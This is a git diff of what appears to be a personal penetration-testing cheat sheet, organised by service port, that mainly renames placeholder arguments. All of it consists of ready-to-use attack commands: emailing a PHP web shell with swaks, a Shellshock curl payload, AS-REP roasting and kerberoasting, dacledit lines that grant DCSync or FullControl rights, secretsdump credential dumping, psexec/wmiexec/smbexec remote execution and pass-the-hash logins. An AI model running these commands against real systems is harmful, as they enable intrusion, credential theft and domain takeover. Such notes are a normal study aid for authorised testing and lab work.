@@ -9,7 +9,7 @@
 ### curl
 ```sh
 # upload
-curl -s -T 'UPLOADFILE' --user 'USERNAME':'PASSWORD' ftp://'IP'
+curl -s -T 'FILE' --user 'USERNAME:PASSWORD' ftp://'IP'
 ```
 ### nmap
 ```sh
@@ -22,8 +22,8 @@ nmap -n -Pn -p21 --script=ftp-anon 'IP'
 ## 22
 ### ssh
 ```sh
-chmod 600 id_rsa
-ssh -i id_rsa.txt 'USERNAME'@'IP'
+chmod 600 'SECRETKEY'
+ssh -i 'SECRETKEY' 'USERNAME@IP'
 ```
 
 
@@ -32,7 +32,7 @@ ssh -i id_rsa.txt 'USERNAME'@'IP'
 ### swaks
 ```sh
 # send webshell
-swaks -f 'FREENAME@DOMAINNAME' -t 'TO_USERNAME@DOMAINNAME' -d '<?php system($_REQUEST["cmd"]); ?>' -s 'IP'
+swaks -f 'FROM_USERNAME@DOMAIN' -t 'TO_USERNAME@DOMAIN' -d '<?php system($_REQUEST["cmd"]); ?>' -s 'IP'
 ```
 
 
@@ -56,8 +56,8 @@ davtest -url 'URL' -cleanup
 ```
 ### ffuf
 ```sh
-ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u http://IP/FUZZ
-ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://IP/FUZZ
+ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u 'URL'/FUZZ
+ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u 'URL'/FUZZ
 ```
 ### nmap
 ```sh
@@ -67,7 +67,7 @@ nmap -n -Pn -p80 --script=http-methods 'IP'
 - shellshock
   ```sh
   # CVE-2014-6271
-  curl -A "() { :;}; COMMAND" http://'IP'
+  curl -A "() { :;}; COMMAND" 'URL'
   ```
   https://github.com/mubix/shellshocker-pocs?tab=readme-ov-file#command-line-linux-osx-and-windows-via-cygwin
 - CVE-2012-4869 - FreePBX = 2.9/2.10
@@ -79,23 +79,23 @@ nmap -n -Pn -p80 --script=http-methods 'IP'
 ### impacket
 ```sh
 # userenum & asreproast
-impacket-GetNPUsers -outputfile 'OUTPUT.txt' -ts -dc-ip 'IP' -usersfile 'USERLIST' 'DOMAINNAME'
-impacket-GetNPUsers -outputfile 'OUTPUT.txt' -ts -dc-ip 'IP' -no-pass 'DOMAINNAME/USERNAME'
+impacket-GetNPUsers -outputfile 'FILE' -ts -dc-ip 'IP' -usersfile 'USERLIST' 'DOMAIN'
+impacket-GetNPUsers -outputfile 'FILE' -ts -dc-ip 'IP' -no-pass 'DOMAIN/USERNAME'
 # kerberoasting (TCP389番も必要)
-impacket-GetUserSPNs -outputfile 'OUTPUT.txt' -ts -dc-ip 'IP' 'DOMAIN/USERNAME:PASSWORD'
+impacket-GetUserSPNs -outputfile 'FILE' -ts -dc-ip 'IP' 'DOMAIN/USERNAME:PASSWORD'
 ```
 ### kerbrute
 ```sh
 # userenum
-./kerbrute_linux_amd64 userenum --dc 'IP' -d 'DOMAINNAME' 'USERLIST'
+./kerbrute_linux_amd64 userenum --dc 'IP' -d 'DOMAIN' 'USERLIST'
 ```
 ### netexec
 ```sh
 # ASREPRoast (TCP389番も必要)
-netexec ldap 'IP' -u 'USERNAMELIST' -p '' --asreproast 'OUTPUT.txt'
-netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --asreproast 'OUTPUT.txt'
+netexec ldap 'IP' -u 'USERLIST' -p '' --asreproast 'FILE'
+netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --asreproast 'FILE'
 # Kerberoasting (TCP389番も必要)
-netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --kdcHost 'IP' --kerberoasting 'OUTPUT.txt'
+netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --kdcHost 'IP' --kerberoasting 'FILE'
 ```
 
 
@@ -118,43 +118,43 @@ https://github.com/XiaoliChan/wmiexec-Pro
 ### impacket
 ```sh
 # write
-impacket-dacledit -ts -dc-ip 'IP' -principal-dn 'DN' -target-dn 'DN' -action write -rights WriteMembers -ace-type allowed 'DOMAIN/USERNAME:PASSWORD@IP'
-impacket-dacledit -ts -dc-ip 'IP' -principal-sid 'SID' -target-sid 'SID' -action write -rights DCSync -ace-type denied 'DOMAIN/USERNAME:PASSWORD@IP'
-impacket-dacledit -ts -dc-ip 'IP' -principal 'SAMACCOUNTNAME' -target 'SAMACCOUNTNAME' -action write -rights FullControl -ace-type allowed 'DOMAIN/USERNAME:PASSWORD@IP'
+impacket-dacledit -ts -dc-ip 'IP' -principal-dn 'DN' -target-dn 'DN' -action write -rights 'FullControl or ResetPassword or WriteMembers or DCSync' -ace-type 'allowed or denied' 'DOMAIN/USERNAME:PASSWORD@IP'
+impacket-dacledit -ts -dc-ip 'IP' -principal-sid 'SID' -target-sid 'SID' ~
+impacket-dacledit -ts -dc-ip 'IP' -principal 'SAMACCOUNTNAME' -target 'SAMACCOUNTNAME' ~
 # read
-impacket-dacledit -ts -dc-ip 'IP' -principal 'SAMACCOUNTNAME' -target-dn 'DN' -action read -rights FullControl -ace-type allowed 'DOMAIN/USERNAME:PASSWORD@IP'
+impacket-dacledit -ts -dc-ip 'IP' -principal 'SAMACCOUNTNAME' -target-dn 'DN' -action read -ace-type 'allowed or denied' 'DOMAIN/USERNAME:PASSWORD@IP'
 # remove
-impacket-dacledit -ts -dc-ip 'IP' -principal 'SAMACCOUNTNAME' -target-dn 'DN' -action remove -rights FullControl -ace-type allowed 'DOMAIN/USERNAME:PASSWORD@IP'
+impacket-dacledit -ts -dc-ip 'IP' -principal 'SAMACCOUNTNAME' -target-dn 'DN' -action remove -rights 'FullControl or ResetPassword or WriteMembers or DCSync' -ace-type 'allowed or denied' 'DOMAIN/USERNAME:PASSWORD@IP'
 ```
 ### net ads
 ```sh
-net ads info -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
+net ads info -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
 # user
-net ads user -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
-net ads user add 'USERNAME' -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
-net ads user delete 'USERNAME' -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
+net ads user -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
+net ads user add 'USERNAME' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
+net ads user delete 'USERNAME' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
 # group
-net ads group add 'GROUPNAME' -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
-net ads group delete 'GROUPNAME' -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
+net ads group add 'GROUPNAME' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
+net ads group delete 'GROUPNAME' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
 # printer
-net ads printer search -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
+net ads printer search -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
 # search
-net ads search 'EXPRESSION' 'ATTRIBUTES' -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
+net ads search 'EXPRESSION' 'ATTRIBUTES' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
 # dn
-net ads search 'DISTINGUISHEDNAME' 'ATTRIBUTES' -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
+net ads search 'DISTINGUISHEDNAME' 'ATTRIBUTES' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
 # sid
-net ads search 'SID' -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
+net ads search 'SID' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
 # workgroup
-net ads workgroup-U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
+net ads workgroup -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
 # lookup
-net ads lookup -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
+net ads lookup -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
 ```
 ### netexec
 ```sh
 # Authentication
 netexec ldap 'IP' -u 'USERNAMELIST' -p '' -k
 # Enumerate Domain Users
-netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --users-export 'OUTPUT.txt'
+netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --users-export 'FILE'
 netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --active-users
 # Enumerate Domain Groups
 netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --groups
@@ -207,11 +207,12 @@ enum4linux-ng -A -u 'USERNAME' -p 'PASSWORD' -t 'TIMEOUT' 'IP'
 ```sh
 # dumping NTLM hashs and Kerberos Keys
 impacket-secretsdump -ts 'DOMAIN/USERNAME:PASSWORD@IP'
+impacket-secretsdump -ts -just-dc-user 'USERNAME' -just-dc-ntlm 'DOMAIN/USERNAME:PASSWORD@IP'
 # exec
 impacket-psexec  -ts 'DOMAIN/USERNAME:PASSWORD@IP'
 impacket-smbexec -share 'SHARENAME' -ts -shell-type 'CMD or POWERSHELL' 'DOMAIN/USERNAME:PASSWORD@IP'
 impacket-wmiexec -share 'SHARENAME' -ts -shell-type 'CMD or POWERSHELL' 'DOMAIN/USERNAME:PASSWORD@IP'
-impacket-dcomexec -share 'SHARENAME' -ts -object 'ShellWindows OR ShellBrowserWindow OR MMC20' -shell-type 'CMD or POWERSHELL' 'DOMAIN/USERNAME:PASSWORD@IP'
+impacket-dcomexec -share 'SHARENAME' -ts -object 'ShellWindows or ShellBrowserWindow or MMC20' -shell-type 'CMD or POWERSHELL' 'DOMAIN/USERNAME:PASSWORD@IP'
 impacket-atexec -ts 'DOMAIN/USERNAME:PASSWORD@IP' 'COMMAND'
 ```
 ### netexec
@@ -223,8 +224,8 @@ netexec smb 'IP' -u 'DOMAIN\USERNAME' -H 'NTHASH'
 # Spidering Shares
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --share 'SHARENAME' -M spider_plus
 # Get and Put Files
-netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --share 'SHARENAME' --get-file '/REMOTEPATH/./.' '/LOCALPATH/./.'
-netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --share 'SHARENAME' --put-file '/LOCALPATH/./.' '/REMOTEPATH/./.'
+netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --share 'SHARENAME' --get-file 'REMOTEPATH' 'LOCALPATH'
+netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --share 'SHARENAME' --put-file 'LOCALPATH' 'REMOTEPATH'
 # Enumeration
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --interfaces
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --disks
@@ -257,47 +258,47 @@ netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --exec-method 'atexec' -x 'C
 ```
 ### net rpc
 ```sh
-net rpc info -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
+net rpc info -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
 # user
-net rpc user -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
-net rpc user info 'USERNAME' -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
-net rpc user add 'USERNAME' 'PASSWORD' -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
-net rpc user password 'USERNAME' 'PASSWORD' -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
-net rpc user rename 'OLD_USERNAME' 'NEW_USERNAME' -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
-net rpc user delete 'USERNAME' -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
+net rpc user -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
+net rpc user info 'USERNAME' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
+net rpc user add 'USERNAME' 'PASSWORD' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
+net rpc user password 'USERNAME' 'PASSWORD' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
+net rpc user rename 'OLD_USERNAME' 'NEW_USERNAME' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
+net rpc user delete 'USERNAME' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
 # group
-net rpc group list global -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
-net rpc group list local -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
-net rpc group list builtin -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
-net rpc group add 'GROUPNAME' -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
-net rpc group rename 'OLD_GROUPNAME' 'NEW_GROUPNAME' -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
-net rpc group delete 'GROUPNAME' -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
-net rpc group members 'GROUPNAME' -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
-net rpc group addmem 'GROUPNAME' 'USERNAME' -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
-net rpc group delmem 'GROUPNAME' 'USERNAME' -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
+net rpc group list global -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
+net rpc group list local -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
+net rpc group list builtin -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
+net rpc group add 'GROUPNAME' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
+net rpc group rename 'OLD_GROUPNAME' 'NEW_GROUPNAME' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
+net rpc group delete 'GROUPNAME' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
+net rpc group members 'GROUPNAME' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
+net rpc group addmem 'GROUPNAME' 'USERNAME' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
+net rpc group delmem 'GROUPNAME' 'USERNAME' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
 # share
-net rpc share -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
+net rpc share -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
 # printer
-net rpc printer list -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
-net rpc printer driver -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
+net rpc printer list -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
+net rpc printer driver -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
 # service
-net rpc service list -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
-net rpc service status 'SERVICENAME' -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
-net rpc service start 'SERVICENAME' -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
-net rpc service stop 'SERVICENAME' -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
-net rpc service create 'SERVICENAME' 'DISPLAYNAME' 'BINARYPATH' -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
-net rpc service delete 'SERVICENAME' -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
+net rpc service list -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
+net rpc service status 'SERVICENAME' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
+net rpc service start 'SERVICENAME' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
+net rpc service stop 'SERVICENAME' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
+net rpc service create 'SERVICENAME' 'DISPLAYNAME' 'BINARYPATH' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
+net rpc service delete 'SERVICENAME' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
 # regisgtry
-net rpc registry enumerate 'KEYPATH' -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
-net rpc registry getvalue 'KEYPATH' 'VALUENAME' -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
-net rpc registry createkey 'KEYPATH' -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
-net rpc registry deletekey 'KEYPATH' -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
-net rpc registry setvalue 'KEYPATH' 'VALUENAME' 'TYPE' 'VALUE' -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
-net rpc registry deletevalue 'KEYPATH' 'VALUENAME' -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
-net rpc registry export 'KEYPATH' 'LOCALPATH' -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
-net rpc registry save 'KEYPATH' 'REMOTEPATH' -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
+net rpc registry enumerate 'KEYPATH' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
+net rpc registry getvalue 'KEYPATH' 'VALUENAME' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
+net rpc registry createkey 'KEYPATH' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
+net rpc registry deletekey 'KEYPATH' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
+net rpc registry setvalue 'KEYPATH' 'VALUENAME' 'TYPE' 'VALUE' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
+net rpc registry deletevalue 'KEYPATH' 'VALUENAME' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
+net rpc registry export 'KEYPATH' 'LOCALPATH' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
+net rpc registry save 'KEYPATH' 'REMOTEPATH' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
 # shell
-net rpc shell -U 'DOMAINNAME/USERNAME%PASSWORD' -S 'IP'
+net rpc shell -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
 ```
 ### smbclient
 ```sh
@@ -306,8 +307,8 @@ smbclient -U 'DOMAIN/USERNAME%NT HASH' --pw-nt-hash -c 'COMMAND' '//HOST/SHARE'
 ```
 ### smbmap
 ```sh
-smbmap -H 'IP or FQDN' -u 'USERNAME' -p 'PASSWORD or NTLM HASH' -d 'DOMAIN' -g 'OUTPUT.txt'
-smbmap -H 'IP or FQDN' -u 'USERNAME' -p 'PASSWORD or NTLM HASH' -d 'DOMAIN' -r 'Recursively FILE' --depth 'DEPTH' -g 'OUTPUT.txt'
+smbmap -H 'IP' -u 'USERNAME' -p 'PASSWORD or NTLM HASH' -d 'DOMAIN' -g 'OUTPUT.txt'
+smbmap -H 'IP' -u 'USERNAME' -p 'PASSWORD or NTLM HASH' -d 'DOMAIN' -r 'Recursively FILE' --depth 'DEPTH' -g 'OUTPUT.txt'
 ```
 ### CVE
 - eternalblue
